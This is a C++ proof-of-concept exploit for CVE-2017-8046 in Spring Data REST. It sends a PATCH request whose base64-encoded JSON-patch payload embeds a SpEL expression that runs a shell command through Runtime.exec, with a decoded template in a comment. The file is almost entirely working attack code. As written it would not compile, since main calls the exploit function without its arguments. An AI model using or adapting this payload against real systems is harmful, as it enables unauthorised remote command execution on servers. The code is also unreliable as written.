#include <iostream>
#include <Windows.h>
#include <winhttp.h>
#include <cstring>
#include <cstdlib>
#include <list>
#include "base64/base64.h"
#pragma comment(lib, "winhttp")
using namespace std;




string getcmd(const char* cmd) {
    string temp;
    for (int i = 0; i < strlen(cmd); i++)
    {
        if (i != strlen(cmd) - 1)
        {
            temp.append(to_string((int)cmd[i]));
            temp.append(",");
        }
        else {
            temp.append(to_string((int)cmd[i]));
        }
    }
    return temp;
}

void CVE_2017_8046(char url, const char * commend) {
    HINTERNET hSession, hConnect, hRequest;
    hSession = WinHttpOpen(L"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, NULL);
    hConnect = WinHttpConnect(hSession, L"192.168.1.100", 8080, 0);

    LPCWSTR URL = L"/customers/1";

    hRequest = WinHttpOpenRequest(hConnect, L"PATCH", URL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    WinHttpAddRequestHeaders(hRequest, L"Accept-Encoding:gzip, deflate", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, L"Accept: */*", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, L"Content-Type:application/json-patch+json", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    LPVOID DATAlpBuffer = (LPVOID)"asdfasd";
    string PAYLOAD_HEAD = "W3sib3AiOiJyZXBsYWNlIiwicGF0aCI6IlQoamF2YS5sYW5nLlJ1bnRpbWUpLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBqYXZhLmxhbmcuU3RyaW5nKG5ldyBieXRlW117";
    PAYLOAD_HEAD = base64_decode(PAYLOAD_HEAD, PAYLOAD_HEAD.length());
    string PAYLOAD_TAIL = "fSkpL2xhc3RuYW1lIiwidmFsdWUiOiJDVkUtMjAxNy04MDQ2In1d";
    PAYLOAD_TAIL = base64_decode(PAYLOAD_TAIL, PAYLOAD_TAIL.length());
    string PAYLOAD = PAYLOAD_HEAD + getcmd((const char*)"touch /tmp/ok.txt") + PAYLOAD_TAIL;
    /*
    [{"op":"replace","path":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{' + shellcode + '}))/lastname","value":"CVE-2017-8046"}]
    */
    const char* DATA = PAYLOAD.c_str();
    BOOL bResults;
    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)DATA, strlen(DATA), strlen(DATA), NULL);

    LPSTR pszOutBuffer = NULL;
    DWORD dwDownloaded = 0;
    DWORD dwSize = 0;
    wchar_t* pwText = NULL;
    if (bResults)
    {
        do
        {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                printf("%s", "Error：WinHttpQueryDataAvailable failed：" + GetLastError());
                break;
            }
            if (!dwSize) {
                break;
            }
            pszOutBuffer = new char[dwSize];
            if (!pszOutBuffer) {
                printf("%s", "Out of memory.");
                break;
            }
            ZeroMemory(pszOutBuffer, dwSize); 
            if (!WinHttpReadData(hRequest, pszOutBuffer, dwSize, &dwDownloaded)) {
                printf("%s", "Error：WinHttpQueryDataAvailable failed：" + GetLastError());
            }
            if (!dwDownloaded) {
                break;
            }
        } while (dwSize > 0);
        DWORD dwNum = MultiByteToWideChar(CP_ACP, 0, pszOutBuffer, -1, NULL, 0);
        pwText = new wchar_t[dwNum];
        MultiByteToWideChar(CP_UTF8, 0, pszOutBuffer, -1, pwText, dwNum);
        printf("Received contents: \n%S", pwText);
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}

int main(int argv, char argc[])
{
    CVE_2017_8046();
}

